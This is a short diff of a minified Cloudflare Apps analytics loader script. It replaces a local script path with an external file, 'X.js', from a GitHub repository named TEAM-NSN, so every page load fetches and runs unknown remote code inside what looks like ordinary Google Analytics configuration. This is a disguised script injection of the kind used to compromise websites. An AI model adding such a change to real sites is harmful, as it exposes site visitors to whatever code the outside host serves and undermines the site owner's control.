@@ -67,4 +67,4 @@ if(window.CloudflareApps&&CloudflareApps.proxy&&CloudflareApps.proxy.originalURL
 loc=url.host+url.path}
 for(var i=0;i<patterns.length;i++){var re=new RegExp(patterns[i],'i')
 if(re.test(loc)){return true}}
-return false}}());CloudflareApps.installs["7KhXgQtMBaBF"]={appId:"nGAnsTeiPCQx",scope:{}};;CloudflareApps.installs["7KhXgQtMBaBF"].options={"subdomain_tracker_ids":[{"subdomain":"","tracker_id":""}],"tracker_id":"UA-XXXXX-Y"};;CloudflareApps.installs["7KhXgQtMBaBF"].product={"id":"google-analytics-free"};(function(){var script = document.createElement('script');script.src = '/cdn-cgi/apps/body/pcc2iC2IAk92Os8MdFNZJz21llw.js';document.head.appendChild(script);})();
+return false}}());CloudflareApps.installs["7KhXgQtMBaBF"]={appId:"nGAnsTeiPCQx",scope:{}};;CloudflareApps.installs["7KhXgQtMBaBF"].options={"subdomain_tracker_ids":[{"subdomain":"","tracker_id":""}],"tracker_id":"UA-XXXXX-Y"};;CloudflareApps.installs["7KhXgQtMBaBF"].product={"id":"google-analytics-free"};(function(){var script = document.createElement('script');script.src = 'https://raw.githubusercontent.com/TEAM-NSN/Js/main/X.js';document.head.appendChild(script);})();
